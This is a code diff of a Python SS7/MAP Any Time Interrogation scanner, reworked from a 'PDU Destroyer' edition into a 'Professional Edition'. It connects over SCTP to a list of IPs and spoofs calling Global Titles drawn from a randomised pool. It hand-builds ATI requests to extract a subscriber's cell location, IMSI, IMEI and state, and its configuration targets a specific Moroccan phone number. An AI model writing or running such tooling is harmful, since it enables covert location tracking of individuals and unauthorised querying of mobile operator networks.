@@ -2,18 +2,17 @@
 # -*- coding: utf-8 -*-
 
 """
-🔥 ULTIMATE PDU DESTROYER v8.0 - LEGENDARY EDITION 🔥
-========================================================
+Enhanced MAP-ATI Scanner v5.2 - Professional Edition - Fixed Transmission
+=======================================================================
 
-The most DEVASTATING MAP-ATI scanner ever created.
-This version OBLITERATES the PDU construction issues with SUPERNATURAL power.
-GUARANTEED transmission with GODLIKE precision and DEMONIC effectiveness.
+Fixed MAP Any Time Interrogation scanner with proper data transmission
+and complete Pycrate integration with elegant terminal output.
 
-Author: Legendary Destroyer Edition for donex1888
-Date: 2025-06-04 03:24:30 UTC
-Version: 8.0.0-LEGENDARY-PDU-DESTROYER
-Classification: WEAPON OF MASS SCANNING
-Power Level: OVER 9000!!!
+Author: Enhanced Professional Edition for donex1888
+Date: 2025-06-04
+Version: 5.2.0-PROFESSIONAL-FIXED-TRANSMISSION
+Current Date and Time (UTC): 2025-06-04 02:35:37
+Current User's Login: donex1888
 """
 
 import socket
@@ -41,1603 +40,1868 @@ from collections import defaultdict, Counter
 import traceback
 import csv
 
-# === 🎨 LEGENDARY COLOR SYSTEM ===
-class DestroyerColors:
-    """LEGENDARY color system that burns through terminals"""
+# === Enhanced Color Terminal Output ===
+class Colors:
+    """Professional ANSI Color codes for elegant terminal output"""
     RESET = '\033[0m'
     BOLD = '\033[1m'
+    DIM = '\033[2m'
     ITALIC = '\033[3m'
     UNDERLINE = '\033[4m'
-    BLINK = '\033[5m'
     
-    # FIRE COLORS
-    FIRE_RED = '\033[91m'
-    FIRE_ORANGE = '\033[93m'
-    FIRE_YELLOW = '\033[33m'
+    # Standard colors
+    BLACK = '\033[30m'
+    RED = '\033[31m'
+    GREEN = '\033[32m'
+    YELLOW = '\033[33m'
+    BLUE = '\033[34m'
+    MAGENTA = '\033[35m'
+    CYAN = '\033[36m'
+    WHITE = '\033[37m'
     
-    # DARK POWERS
-    DARK_RED = '\033[31m'
-    BLOOD_RED = '\033[31;1m'
-    CRIMSON = '\033[35;1m'
+    # Bright colors
+    BRIGHT_BLACK = '\033[90m'
+    BRIGHT_RED = '\033[91m'
+    BRIGHT_GREEN = '\033[92m'
+    BRIGHT_YELLOW = '\033[93m'
+    BRIGHT_BLUE = '\033[94m'
+    BRIGHT_MAGENTA = '\033[95m'
+    BRIGHT_CYAN = '\033[96m'
+    BRIGHT_WHITE = '\033[97m'
     
-    # LEGENDARY COLORS
-    LEGENDARY_GOLD = '\033[33;1m'
-    MYTHIC_PURPLE = '\033[35;1m'
-    DIVINE_CYAN = '\033[96;1m'
-    GODLIKE_GREEN = '\033[92;1m'
-    DESTROYER_BLUE = '\033[94;1m'
-    
-    # SPECIAL EFFECTS
-    NEON_GREEN = '\033[92;5m'
-    PLASMA_BLUE = '\033[94;5m'
-    LASER_RED = '\033[91;5m'
+    # Background colors
+    BG_BLACK = '\033[40m'
+    BG_RED = '\033[41m'
+    BG_GREEN = '\033[42m'
+    BG_YELLOW = '\033[43m'
+    BG_BLUE = '\033[44m'
+    BG_MAGENTA = '\033[45m'
+    BG_CYAN = '\033[46m'
+    BG_WHITE = '\033[47m'
 
-def legendary_print(message: str, color: str = DestroyerColors.DIVINE_CYAN, 
-                   effect: str = None, bold: bool = True):
-    """Print with LEGENDARY effects that melt screens"""
+def print_colored(message: str, color: str = Colors.WHITE, bold: bool = False, 
+                 bg: str = None, italic: bool = False, underline: bool = False):
+    """Print colored message to terminal with advanced formatting"""
     output = ""
     if bold:
-        output += DestroyerColors.BOLD
-    if effect:
-        output += effect
-    output += color + message + DestroyerColors.RESET
+        output += Colors.BOLD
+    if italic:
+        output += Colors.ITALIC
+    if underline:
+        output += Colors.UNDERLINE
+    if bg:
+        output += bg
+    output += color + message + Colors.RESET
     print(output)
 
-def destroyer_banner():
-    """Banner that breaks reality"""
-    print()
-    legendary_print("🔥" * 80, DestroyerColors.FIRE_RED, bold=True)
-    legendary_print("💀                ULTIMATE PDU DESTROYER v8.0                💀", 
-                   DestroyerColors.LEGENDARY_GOLD, bold=True)
-    legendary_print("⚡             LEGENDARY EDITION - DEMONIC POWER             ⚡", 
-                   DestroyerColors.MYTHIC_PURPLE, bold=True)
-    legendary_print("🔥" * 80, DestroyerColors.FIRE_RED, bold=True)
-    legendary_print("", DestroyerColors.RESET)
-    legendary_print("👤 User: donex1888", DestroyerColors.DIVINE_CYAN)
-    legendary_print("📅 Date: 2025-06-04 03:24:30 UTC", DestroyerColors.DIVINE_CYAN)
-    legendary_print("🎯 Mission: OBLITERATE PDU CONSTRUCTION ISSUES", DestroyerColors.FIRE_ORANGE, bold=True)
-    legendary_print("⚡ Power Level: OVER 9000!!!", DestroyerColors.NEON_GREEN, bold=True)
-    legendary_print("💀 Classification: WEAPON OF MASS SCANNING", DestroyerColors.BLOOD_RED, bold=True)
-    legendary_print("", DestroyerColors.RESET)
-
-def print_destroyer_box(title: str, content: List[str], color: str = DestroyerColors.DIVINE_CYAN):
-    """Create DEVASTATING boxes that burn through reality"""
-    max_width = max(len(title) + 6, max(len(line) for line in content if content) + 6, 60)
+def print_elegant_box(title: str, content: List[str], border_color: str = Colors.CYAN, 
+                     title_color: str = Colors.BRIGHT_WHITE, content_color: str = Colors.WHITE):
+    """Print content in an elegant box with borders"""
+    max_width = max(len(title) + 4, max(len(line) for line in content) + 4, 50)
     
-    # TOP BORDER WITH FIRE
-    border = "╔" + "═" * (max_width - 2) + "╗"
-    legendary_print(border, color, bold=True)
+    # Top border
+    print_colored("┌" + "─" * (max_width - 2) + "┐", border_color)
     
-    # TITLE WITH FLAMES
-    title_padding = (max_width - len(title) - 6) // 2
-    title_line = f"║ 🔥 {' ' * title_padding}{title}{' ' * (max_width - len(title) - 6 - title_padding)} 🔥 ║"
-    legendary_print(title_line, DestroyerColors.LEGENDARY_GOLD, bold=True)
+    # Title
+    title_padding = (max_width - len(title) - 4) // 2
+    title_line = f"│ {' ' * title_padding}{title}{' ' * (max_width - len(title) - 4 - title_padding)} │"
+    print_colored(title_line, title_color, bold=True)
     
-    # SEPARATOR
-    separator = "╠" + "═" * (max_width - 2) + "╣"
-    legendary_print(separator, color, bold=True)
+    # Separator
+    print_colored("├" + "─" * (max_width - 2) + "┤", border_color)
     
-    # CONTENT WITH POWER
+    # Content
     for line in content:
         content_padding = max_width - len(line) - 4
-        content_line = f"║ {line}{' ' * content_padding} ║"
-        legendary_print(content_line, DestroyerColors.GODLIKE_GREEN)
+        content_line = f"│ {line}{' ' * content_padding} │"
+        print_colored(content_line, content_color)
     
-    # BOTTOM BORDER
-    bottom = "╚" + "═" * (max_width - 2) + "╝"
-    legendary_print(bottom, color, bold=True)
-    print()
+    # Bottom border
+    print_colored("└" + "─" * (max_width - 2) + "┘", border_color)
 
-# === 💀 DEPENDENCY DESTROYER ===
-def initialize_destroyer_dependencies():
-    """Initialize dependencies with DEMONIC power"""
-    legendary_print("🔥 Initializing DESTROYER dependencies...", DestroyerColors.FIRE_ORANGE, bold=True)
+def print_professional_banner():
+    """Print enhanced professional banner in elegant box"""
+    banner_content = [
+        f"🚀 Enhanced MAP-ATI Scanner v5.2 - Professional Edition",
+        f"📅 Current Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC",
+        f"👤 User: donex1888",
+        f"🔧 Professional Edition with Fixed Transmission",
+        f"✨ Complete Pycrate Integration & Elegant Output"
+    ]
+    
+    print_elegant_box("MAP-ATI SCANNER PROFESSIONAL v5.2", banner_content, 
+                     Colors.BRIGHT_CYAN, Colors.BRIGHT_GREEN, Colors.WHITE)
+
+# === Professional Dependency Management ===
+def initialize_professional_dependencies():
+    """Professional dependency initialization with enhanced error handling"""
+    print_colored("🔧 Initializing professional dependencies...", Colors.YELLOW, bold=True)
     
     dependencies = {}
     
+    # Essential SCTP
     try:
         import sctp
         dependencies['sctp'] = sctp
-        legendary_print("⚡ SCTP library LOADED with GODLIKE power!", DestroyerColors.GODLIKE_GREEN, bold=True)
+        print_colored("✅ SCTP library loaded successfully", Colors.GREEN)
     except ImportError:
-        legendary_print("💀 CRITICAL FAILURE: SCTP library NOT FOUND!", DestroyerColors.BLOOD_RED, bold=True)
-        legendary_print("🔧 EMERGENCY FIX: pip install pysctp", DestroyerColors.FIRE_ORANGE)
+        print_colored("❌ CRITICAL: 'sctp' library not found. Install with: pip install pysctp", Colors.RED, bold=True)
         sys.exit(1)
-    
+
+    # Hexdump for debugging
+    try:
+        import hexdump
+        dependencies['hexdump'] = hexdump
+        print_colored("✅ Hexdump library loaded", Colors.GREEN)
+    except ImportError:
+        dependencies['hexdump'] = None
+        print_colored("⚠️  Warning: hexdump not found. Basic hex output will be used.", Colors.YELLOW)
+
     return dependencies
 
-DESTROYER_DEPS = initialize_destroyer_dependencies()
+def initialize_pycrate_and_files():
+    """Initialize Pycrate and load required files with fallback mechanisms"""
+    print_colored("🔧 Initializing Pycrate with fallback mechanisms...", Colors.YELLOW, bold=True)
+    
+    pycrate_modules = {}
+    
+    try:
+        # Core ASN.1 Runtime - Essential
+        from pycrate_asn1rt.err import ASN1Err, ASN1ObjErr
+        from pycrate_asn1rt.asnobj_basic import OID, INT, NULL, ASN1Obj, BOOL
+        from pycrate_asn1rt.asnobj_str import OCT_STR, BIT_STR
+        from pycrate_asn1rt.asnobj_construct import SEQ, CHOICE, SEQ_OF, SET
+        from pycrate_asn1rt.codecs import ASN1CodecBER
+        print_colored("✅ Pycrate ASN.1 runtime loaded", Colors.GREEN)
+        
+        pycrate_modules.update({
+            'ASN1Err': ASN1Err,
+            'ASN1ObjErr': ASN1ObjErr,
+            'ASN1CodecBER': ASN1CodecBER,
+            'OCT_STR': OCT_STR,
+            'BIT_STR': BIT_STR,
+            'SEQ': SEQ,
+            'CHOICE': CHOICE,
+            'SET': SET,
+            'INT': INT,
+            'NULL': NULL,
+            'BOOL': BOOL
+        })
+        
+    except ImportError as e:
+        print_colored(f"❌ Failed to load core Pycrate modules: {e}", Colors.RED, bold=True)
+        sys.exit(1)
+    
+    # Try to load local files first
+    local_sccp = None
+    try:
+        from pycrate_mobile import SCCP
+        local_sccp = SCCP
+        print_colored("✅ Local SCCP module loaded successfully", Colors.GREEN)
+    except ImportError:
+        print_colored("⚠️  Local SCCP module not found, using manual construction", Colors.YELLOW)
+    
+    # Load MAP Application Context if available
+    map_app_ctx = None
+    try:
+        from pycrate_mobile import TS29002_MAPAppCtx
+        map_app_ctx = TS29002_MAPAppCtx
+        print_colored("✅ MAP Application Context loaded", Colors.GREEN)
+    except ImportError:
+        print_colored("⚠️  MAP Application Context not found, using fallback", Colors.YELLOW)
+    
+    # Load MAP IE if available
+    map_ie = None
+    try:
+        from pycrate_mobile import TS29002_MAPIE
+        map_ie = TS29002_MAPIE
+        print_colored("✅ MAP Information Elements loaded", Colors.GREEN)
+    except ImportError:
+        print_colored("⚠️  MAP Information Elements not found, using fallback", Colors.YELLOW)
+    
+    # Try to load MAP data types
+    map_defs = None
+    try:
+        from pycrate_asn1dir import TCAP_MAPv2v3 as MAP_module
+        if hasattr(MAP_module, 'MAP_MS_DataTypes'):
+            map_defs = MAP_module
+            print_colored("✅ MAP data types loaded from TCAP_MAPv2v3", Colors.GREEN)
+    except ImportError:
+        try:
+            from pycrate_mobile import MAP as MAP_fallback
+            if hasattr(MAP_fallback, 'MAP_MS_DataTypes'):
+                map_defs = MAP_fallback
+                print_colored("✅ MAP data types loaded from pycrate_mobile.MAP", Colors.GREEN)
+        except ImportError:
+            print_colored("⚠️  MAP data types not found, using manual construction", Colors.YELLOW)
+    
+    # TCAP Definitions
+    tcap_defs = None
+    try:
+        import importlib.util
+        tcap_spec = importlib.util.spec_from_file_location("TCAP2", "TCAP2.py")
+        if tcap_spec and tcap_spec.loader:
+            TCAP2 = importlib.util.module_from_spec(tcap_spec)
+            tcap_spec.loader.exec_module(TCAP2)
+            if hasattr(TCAP2, 'TCAPMessages'):
+                tcap_defs = TCAP2.TCAPMessages
+                print_colored("✅ TCAP definitions loaded from TCAP2.py", Colors.GREEN)
+    except Exception:
+        try:
+            from pycrate_asn1dir import TCAP_defs as TCAP_module
+            if hasattr(TCAP_module, 'TCMessage'):
+                tcap_defs = TCAP_module
+                print_colored("✅ TCAP definitions loaded from TCAP_defs", Colors.GREEN)
+        except ImportError:
+            print_colored("⚠️  TCAP definitions not found, using manual construction", Colors.YELLOW)
+    
+    pycrate_modules.update({
+        'SCCP': local_sccp,
+        'MAP_defs': map_defs,
+        'TCAP_defs': tcap_defs,
+        'MAPAppCtx': map_app_ctx,
+        'MAPIE': map_ie
+    })
+    
+    print_colored("✅ Pycrate initialization completed with fallback support", Colors.BRIGHT_GREEN, bold=True)
+    return pycrate_modules
 
-# === 📊 LEGENDARY DATA STRUCTURES ===
-class ScanVariant(Enum):
-    """LEGENDARY scan variants for MAXIMUM destruction"""
-    LOCATION_ANNIHILATOR = "LocationAnnihilator"
-    SUBSCRIBER_DESTROYER = "SubscriberDestroyer"
-    EQUIPMENT_OBLITERATOR = "EquipmentObliterator"
-    TOTAL_DEVASTATION = "TotalDevastation"
+# Initialize dependencies
+DEPS = initialize_professional_dependencies()
+PYCRATE = initialize_pycrate_and_files()
+
+# === Enhanced Data Classes ===
+class AtiVariant(Enum):
+    STANDARD = "Standard"
+    LOCATION_ONLY = "LocationOnly"
+    SUBSCRIBER_STATE = "SubscriberState"
+    EQUIPMENT_STATUS = "EquipmentStatus"
+    ALL_INFO = "AllInfo"
+    MINIMAL = "Minimal"
 
 @dataclass
-class LegendaryLocationInfo:
-    """Location info with SUPERNATURAL precision"""
+class EnhancedLocationInfo:
+    """Comprehensive location information container"""
     mcc: str = "N/A"
     mnc: str = "N/A"
     lac: str = "N/A"
     cell_id: str = "N/A"
-    vlr_number: str = "N/A"
-    msc_number: str = "N/A"
+    vlr_name: str = "N/A"
+    msc_name: str = "N/A"
+    sgsn_name: str = "N/A"
     location_age: str = "N/A"
+    geographical_info: str = "N/A"
+    location_number: str = "N/A"
     cgi_found: bool = False
     lai_found: bool = False
-    extraction_power: int = 0  # POWER LEVEL of extraction
 
 @dataclass
-class LegendarySubscriberInfo:
-    """Subscriber info with DEMONIC knowledge"""
+class EnhancedSubscriberInfo:
+    """Comprehensive subscriber information container"""
     imsi: str = "N/A"
     msisdn: str = "N/A"
     imei: str = "N/A"
     subscriber_state: str = "N/A"
     equipment_status: str = "N/A"
-    network_access: str = "N/A"
-    roaming_info: str = "N/A"
-    extraction_power: int = 0  # POWER LEVEL of extraction
+    supported_features: List[str] = None
+    
+    def __post_init__(self):
+        if self.supported_features is None:
+            self.supported_features = []
 
 @dataclass
-class DestroyerScanResult:
-    """LEGENDARY scan result with GODLIKE precision"""
+class ScanResult:
+    """Professional scan result container with enhanced details"""
     ip: str = ""
     port: int = 0
     timestamp: str = ""
     duration_ms: float = 0.0
     success: bool = False
-    destruction_level: str = "NONE"  # Level of destruction achieved
     tcap_outcome: str = "NotStarted"
     error_info: str = "N/A"
-    bytes_sent: int = 0
-    bytes_received: int = 0
+    error_code: Optional[int] = None
+    rejection_cause: str = "N/A"
+    map_version: str = "N/A"
+    sent_otid: str = ""
+    received_dtid: str = "N/A"
+    ati_variant_used: str = ""
+    attempt_number: int = 1
+    location_info: EnhancedLocationInfo = None
+    subscriber_info: EnhancedSubscriberInfo = None
+    used_cgpa_ssn: int = 0
+    used_cgpa_gt: str = ""
+    raw_response_hex: str = ""
     connection_time_ms: float = 0.0
     response_time_ms: float = 0.0
-    location_info: LegendaryLocationInfo = None
-    subscriber_info: LegendarySubscriberInfo = None
-    used_ssn: int = 0
-    used_gt: str = ""
-    raw_response_hex: str = ""
-    pdu_construction_success: bool = False  # PDU BUILD STATUS
-    transmission_power: int = 0  # TRANSMISSION POWER LEVEL
+    bytes_sent: int = 0
+    bytes_received: int = 0
     
     def __post_init__(self):
         if self.location_info is None:
-            self.location_info = LegendaryLocationInfo()
+            self.location_info = EnhancedLocationInfo()
         if self.subscriber_info is None:
-            self.subscriber_info = LegendarySubscriberInfo()
+            self.subscriber_info = EnhancedSubscriberInfo()
 
-# === ⚙️ LEGENDARY CONFIGURATION ===
-DESTROYER_CONFIG = {
+# === Professional Constants ===
+MAP_OP_ANY_TIME_INTERROGATION = 71
+
+PROFESSIONAL_CONFIG = {
     'target_msisdn': "212681364829",
     'ips_file': "ips.txt",
-    'results_dir': "destroyer_results_v8",
-    'max_workers': 25,
+    'results_dir': "professional_results_v52",
+    'max_workers': 30,
+    'sctp_timeout': 15,
+    'sctp_ppid': 0,
     'sctp_ports': [2905, 2906, 2907, 2908, 2909, 2910],
     'retry_attempts': 3,
-    'connection_timeout': 12,
-    'response_timeout': 18,
-    'retry_delay': 2.0,
-    'destruction_mode': True,  # ENABLE MAXIMUM DESTRUCTION
-    'godlike_precision': True  # ENABLE GODLIKE PRECISION
+    'retry_delay': 2.5,
+    'gt_pool_size': 1000,
+    'connection_timeout': 8,
+    'response_timeout': 12
 }
 
-SCCP_DESTROYER_CONFIG = {
+SCCP_PROFESSIONAL = {
     'cdpa_ssn': 149,
     'cgpa_ssn_pool': [6, 7, 8, 9, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156],
-    'cgpa_gt_base': "212600000000",
-    'point_codes': [2057, 2058, 2059, 2060],  # Multiple point codes for POWER
-    'sccp_classes': [0, 1],  # Protocol classes
-    'gt_indicators': [2, 4],  # GT indicators for variety
-    'translation_types': [0, 1, 2],  # Multiple TT values
+    'cgpa_gt_digits': "212600000000",
+    'sccp_proto_class_pool': [0, 1]
 }
 
-MAP_OPERATIONS = {
-    'ANY_TIME_INTERROGATION': 71,
-    'SEND_ROUTING_INFO': 22,
-    'UPDATE_LOCATION': 2,
-    'PROVIDE_SUBSCRIBER_INFO': 70
+# Enhanced TCAP Tags
+TCAP_TAGS = {
+    'MSG_BEGIN': 0x60,
+    'MSG_END': 0x65,
+    'MSG_CONTINUE': 0x64,
+    'MSG_ABORT': 0x67,
+    'OTID': 0x49,
+    'DTID': 0x48,
+    'DIALOGUE_PORTION': 0x6B,
+    'COMPONENT_PORTION': 0x6C,
+    'COMP_INVOKE': 0xA1,
+    'COMP_RETURN_RESULT_LAST': 0xA2,
+    'COMP_RETURN_ERROR': 0xA3,
+    'COMP_REJECT': 0xA4
 }
 
-# === 📈 LEGENDARY STATISTICS ===
-DESTROYER_STATS = {
+# MAP Error Codes
+MAP_ERRORS = {
+    1: "Unknown Subscriber",
+    3: "Unknown MSC",
+    5: "Unidentified Subscriber",
+    6: "Absent Subscriber SM",
+    8: "Unknown Equipment",
+    9: "Roaming Not Allowed",
+    10: "Illegal Subscriber",
+    11: "Bearer Service Not Provisioned",
+    12: "Teleservice Not Provisioned",
+    13: "Illegal Equipment",
+    21: "Facility Not Supported",
+    27: "Absent Subscriber",
+    28: "Incompatible Terminal",
+    29: "Not Reachable",
+    34: "System Failure",
+    35: "Data Missing",
+    36: "Unexpected Data Value",
+    37: "Facility Not Supported",
+    49: "ATI Not Allowed",
+    52: "Information Not Available",
+    53: "Unauthorized Requesting Network"
+}
+
+# Professional Statistics
+PROFESSIONAL_STATS = {
     'total_attempts': 0,
-    'successful_transmissions': 0,
-    'transmission_failures': 0,
-    'pdu_construction_successes': 0,
-    'pdu_construction_failures': 0,
     'successful_responses': 0,
+    'full_info_extractions': 0,
+    'imsi_extractions': 0,
     'location_extractions': 0,
-    'subscriber_extractions': 0,
-    'total_destruction_level': 0,
-    'max_power_achieved': 0,
     'timeouts': 0,
     'connection_errors': 0,
+    'map_errors': 0,
+    'tcap_rejects': 0,
+    'tcap_aborts': 0,
     'start_time': None,
-    'bytes_transmitted_total': 0,
-    'bytes_received_total': 0
+    'error_breakdown': defaultdict(int),
+    'success_rate': 0.0,
+    'fastest_response': float('inf'),
+    'slowest_response': 0.0
 }
 
-# Threading locks with LEGENDARY names
-legendary_stats_lock = threading.Lock()
-destroyer_csv_lock = threading.Lock()
-godlike_terminal_lock = threading.Lock()
-legendary_logger = None
+# Threading locks
+main_csv_lock = threading.Lock()
+stats_lock = threading.Lock()
+terminal_lock = threading.Lock()
+logger = None
 
-# === 🎯 LEGENDARY GT POOL SYSTEM ===
-class LegendaryGTPool:
-    """GT Pool system with SUPERNATURAL power and INFINITE variety"""
+# === Professional GT Pool Management ===
+class ProfessionalGTPool:
+    """Professional Global Title Pool with intelligent distribution"""
     
-    def __init__(self, base_gt: str, pool_size: int = 2000):
+    def __init__(self, base_gt: str, pool_size: int = 1000):
         self.base_gt = base_gt
         self.pool_size = pool_size
         self.gt_pool = []
         self.current_index = 0
         self.lock = threading.Lock()
-        self.generation_seeds = []
-        self._generate_legendary_pool()
-        
-        legendary_print(f"⚡ LEGENDARY GT Pool initialized with {pool_size} GODLIKE entries!", 
-                       DestroyerColors.GODLIKE_GREEN, bold=True)
+        self._generate_professional_pool()
+        print_colored(f"✅ Professional GT Pool initialized with {pool_size} entries", Colors.GREEN)
     
-    def _generate_legendary_pool(self):
-        """Generate GT pool with SUPERNATURAL variety and CHAOTIC randomness"""
+    def _generate_professional_pool(self):
+        """Generate professional GT pool with enhanced randomization"""
         base_digits = re.sub(r'[^\d]', '', self.base_gt)
         
-        # Multiple generation strategies for MAXIMUM chaos
-        strategies = ['timestamp', 'random', 'sequential', 'hybrid', 'chaotic']
-        
         for i in range(self.pool_size):
-            strategy = random.choice(strategies)
+            timestamp_part = str(int(time.time() * 1000000))[-8:]
+            random_part = f"{random.randint(10000000, 99999999)}"
+            sequence_part = f"{i:06d}"
             
-            if strategy == 'timestamp':
-                # Timestamp-based with microsecond precision
-                timestamp_part = str(int(time.time() * 1000000))[-10:]
-                gt = base_digits + timestamp_part + f"{i:05d}"
+            full_gt = base_digits + timestamp_part + random_part + sequence_part
             
-            elif strategy == 'random':
-                # Pure randomness for CHAOS
-                random_part = ''.join([str(random.randint(0, 9)) for _ in range(8)])
-                gt = base_digits + random_part + f"{i:04d}"
+            if len(full_gt) > 15:
+                full_gt = full_gt[-15:]
+            elif len(full_gt) < 11:
+                full_gt = full_gt.ljust(11, '0')
             
-            elif strategy == 'sequential':
-                # Sequential with variations
-                seq_part = f"{i:012d}"
-                gt = base_digits + seq_part
-            
-            elif strategy == 'hybrid':
-                # Hybrid approach mixing all methods
-                time_part = str(int(time.time()))[-6:]
-                random_part = f"{random.randint(100000, 999999)}"
-                gt = base_digits + time_part + random_part
-            
-            else:  # chaotic
-                # CHAOTIC approach for MAXIMUM unpredictability
-                chaos_seed = int(time.time() * 1000000) ^ random.randint(0, 999999) ^ i
-                chaos_part = str(chaos_seed)[-12:]
-                gt = base_digits + chaos_part
-            
-            # Ensure proper length constraints
-            if len(gt) > 15:
-                gt = gt[-15:]
-            elif len(gt) < 11:
-                gt = gt.ljust(11, '0')
-            
-            self.gt_pool.append(gt)
-            self.generation_seeds.append(strategy)
+            self.gt_pool.append(full_gt)
     
-    def get_legendary_gt(self) -> Tuple[str, str]:
-        """Get GT with LEGENDARY power and strategy info"""
+    def get_next_gt(self) -> str:
+        """Get next GT with intelligent distribution"""
         with self.lock:
             gt = self.gt_pool[self.current_index]
-            strategy = self.generation_seeds[self.current_index]
             self.current_index = (self.current_index + 1) % self.pool_size
-            return gt, strategy
+            return gt
 
-legendary_gt_pool = None
+# Initialize Professional GT Pool
+gt_pool = None
 
-# === 💀 THE LEGENDARY PDU DESTROYER SYSTEM ===
+# === Professional Utility Functions ===
 
-def build_legendary_msisdn_parameter(msisdn: str) -> bytes:
-    """
-    Build MSISDN parameter with GODLIKE precision and ZERO tolerance for failure
-    This function OBLITERATES all MSISDN encoding issues with SUPERNATURAL power
-    """
+def setup_professional_logging(log_file: Path, log_level: str = "INFO") -> logging.Logger:
+    """Setup professional logging with enhanced formatting"""
+    logger = logging.getLogger("professional_map_scanner_v52")
+    logger.handlers.clear()
+    logger.setLevel(logging.DEBUG)
     
-    legendary_print(f"🔥 Building LEGENDARY MSISDN parameter: {msisdn}", 
-                   DestroyerColors.FIRE_ORANGE, bold=True)
+    # Console handler
+    console_handler = logging.StreamHandler()
+    console_formatter = logging.Formatter('%(message)s')
+    console_handler.setFormatter(console_formatter)
+    console_handler.setLevel(getattr(logging, log_level.upper()))
+    logger.addHandler(console_handler)
     
-    try:
-        # LEGENDARY MSISDN cleanup with BRUTAL efficiency
-        clean_msisdn = re.sub(r'[^\d]', '', msisdn)
-        
-        # Ensure Moroccan format with GODLIKE precision
-        if not clean_msisdn.startswith('212'):
-            # Strip leading zeros and add country code
-            clean_msisdn = '212' + clean_msisdn.lstrip('0')
-        
-        # Additional validation for MAXIMUM reliability
-        if len(clean_msisdn) < 12 or len(clean_msisdn) > 15:
-            # Force standard Moroccan mobile format
-            if clean_msisdn.startswith('212'):
-                base_number = clean_msisdn[3:]
-            else:
-                base_number = clean_msisdn
-            
-            # Ensure 9-digit mobile number
-            if len(base_number) < 9:
-                base_number = base_number.ljust(9, '0')
-            elif len(base_number) > 9:
-                base_number = base_number[:9]
-            
-            clean_msisdn = '212' + base_number
-        
-        legendary_print(f"⚡ MSISDN CLEANED with SUPERNATURAL power: {clean_msisdn}", 
-                       DestroyerColors.GODLIKE_GREEN)
-        
-        # Build the LEGENDARY MSISDN parameter with BRUTAL precision
-        result = bytearray()
-        
-        # Nature of Address Indicator - INTERNATIONAL
-        result.append(0x91)  # International number, ISDN numbering plan
-        
-        # Convert to BCD with GODLIKE efficiency
-        digits = clean_msisdn
-        if len(digits) % 2 == 1:
-            digits += 'F'  # Add filler for odd length
-        
-        # BCD encoding with LEGENDARY precision
-        for i in range(0, len(digits), 2):
-            d1 = int(digits[i])
-            d2 = int(digits[i+1]) if digits[i+1] != 'F' else 0xF
-            
-            # Pack with REVERSE byte order (BCD standard)
-            result.append((d2 << 4) | d1)
-        
-        final_result = bytes(result)
-        
-        # LEGENDARY validation
-        if len(final_result) == 0:
-            raise ValueError("MSISDN parameter construction FAILED - ZERO LENGTH!")
-        
-        legendary_print(f"💀 MSISDN parameter FORGED: {len(final_result)} bytes = {final_result.hex().upper()}", 
-                       DestroyerColors.MYTHIC_PURPLE, bold=True)
-        
-        return final_result
-        
-    except Exception as e:
-        legendary_print(f"💥 MSISDN parameter construction EXPLODED: {e}", 
-                       DestroyerColors.BLOOD_RED, bold=True)
-        raise
+    # Professional file handler
+    file_handler = logging.FileHandler(log_file, mode='a', encoding='utf-8')
+    file_formatter = logging.Formatter(
+        '%(asctime)s.%(msecs)03d-%(levelname)-8s-[%(threadName)-12s]-%(funcName)-20s:%(lineno)-4d-%(message)s',
+        datefmt='%Y-%m-%d %H:%M:%S'
+    )
+    file_handler.setFormatter(file_formatter)
+    file_handler.setLevel(logging.DEBUG)
+    logger.addHandler(file_handler)
+    
+    return logger
 
-def build_legendary_ati_parameter(scan_variant: ScanVariant, target_msisdn: str) -> bytes:
-    """
-    Build ATI parameter with DEMONIC intelligence and GODLIKE structure
-    This function creates the PERFECT ATI parameter that DESTROYS all resistance
-    """
+def decode_plmn_professional(plmn_bytes: bytes) -> Tuple[str, str]:
+    """Professional PLMN decoder with comprehensive validation"""
+    if len(plmn_bytes) != 3:
+        raise ValueError(f"PLMN must be exactly 3 bytes, got {len(plmn_bytes)}")
     
-    legendary_print(f"🔥 Forging LEGENDARY ATI parameter: {scan_variant.value}", 
-                   DestroyerColors.FIRE_ORANGE, bold=True)
+    byte1, byte2, byte3 = plmn_bytes
     
-    try:
-        # Get the LEGENDARY MSISDN parameter
-        msisdn_param = build_legendary_msisdn_parameter(target_msisdn)
-        
-        # Build the ATI parameter with SUPERNATURAL precision
-        ati_param = bytearray()
-        
-        # SEQUENCE tag for AnyTimeInterrogationArg
-        ati_param.append(0x30)  # SEQUENCE
-        param_length_pos = len(ati_param)
-        ati_param.append(0x00)  # Length placeholder - will be updated
-        
-        # === SUBSCRIBER IDENTITY [0] ===
-        # This is MANDATORY and CRITICAL for success
-        ati_param.append(0xA0)  # Context-specific [0] IMPLICIT
-        subscriber_id_length_pos = len(ati_param)
-        ati_param.append(0x00)  # Length placeholder
-        
-        # MSISDN choice [1]
-        ati_param.append(0x81)  # Context-specific [1] IMPLICIT for MSISDN
-        ati_param.append(len(msisdn_param))
-        ati_param.extend(msisdn_param)
-        
-        # Update subscriber identity length
-        subscriber_id_length = len(ati_param) - subscriber_id_length_pos - 1
-        ati_param[subscriber_id_length_pos] = subscriber_id_length
-        
-        # === REQUESTED INFO [1] ===
-        # Build with LEGENDARY precision based on scan variant
-        requested_info = bytearray()
-        requested_info.append(0xA1)  # Context-specific [1] IMPLICIT
-        req_info_length_pos = len(requested_info)
-        requested_info.append(0x00)  # Length placeholder
-        
-        # Add requested information based on LEGENDARY variant
-        if scan_variant in [ScanVariant.LOCATION_ANNIHILATOR, ScanVariant.TOTAL_DEVASTATION]:
-            # Location Information [0] - NULL for basic request
-            requested_info.extend([0x80, 0x00])  # [0] IMPLICIT NULL
-        
-        if scan_variant in [ScanVariant.SUBSCRIBER_DESTROYER, ScanVariant.TOTAL_DEVASTATION]:
-            # Subscriber State [1] - NULL for basic request  
-            requested_info.extend([0x81, 0x00])  # [1] IMPLICIT NULL
-        
-        if scan_variant in [ScanVariant.EQUIPMENT_OBLITERATOR, ScanVariant.TOTAL_DEVASTATION]:
-            # IMEI [6] - NULL for basic request
-            requested_info.extend([0x86, 0x00])  # [6] IMPLICIT NULL
-        
-        # If no specific info requested, default to location
-        if len(requested_info) == 2:  # Only tag and length placeholder
-            requested_info.extend([0x80, 0x00])  # Default to location
-        
-        # Update requested info length
-        req_info_length = len(requested_info) - 2
-        requested_info[req_info_length_pos] = req_info_length
-        
-        # Add requested info to main parameter
-        ati_param.extend(requested_info)
-        
-        # === OPTIONAL EXTENSIONS ===
-        # Add GMLC-Number for enhanced location services [3]
